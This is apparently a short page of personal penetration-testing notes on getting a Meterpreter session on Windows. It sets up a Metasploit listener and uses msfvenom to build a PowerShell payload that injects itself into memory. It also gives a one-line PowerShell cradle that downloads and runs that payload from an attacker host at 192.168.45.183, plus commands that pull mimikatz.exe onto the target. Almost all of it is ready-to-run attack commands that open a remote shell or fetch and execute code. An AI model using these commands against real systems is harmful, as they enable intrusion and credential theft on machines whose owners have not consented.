public:: true

- Meterpreter
	- Start the listener
	  ```bash
	  msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.183;set LPORT 8444;run;"
	  ```
	- Prepare the agent in powershell
		- ```bash
		  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.183 LPORT=4444 -f psh > meterpreter.ps1
		  ```
		- Using `-f psh` generates a powershell script which perform an *in-memory injection* (Remote Process Memory Injection) and the specified payload
		  logseq.order-list-type:: number
		- Using `-f powershell` only generates the payload
		  logseq.order-list-type:: number
- Download and execute from powershell
	- ```powershell
	  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.183:8000/meterpreter.ps1');meterpreter"
	  ```
- Download to disk with powershell
	- ```powershell
	  powershell -c "Invoke-WebRequest 'http://192.168.45.183:8000/mimikatz.exe' -OutFile 'mimikatz.exe'"
	  
	  # OR
	  
	  Invoke-WebRequest "http://192.168.45.183:8000/mimikatz.exe" -OutFile "mimikatz.exe"
	  ```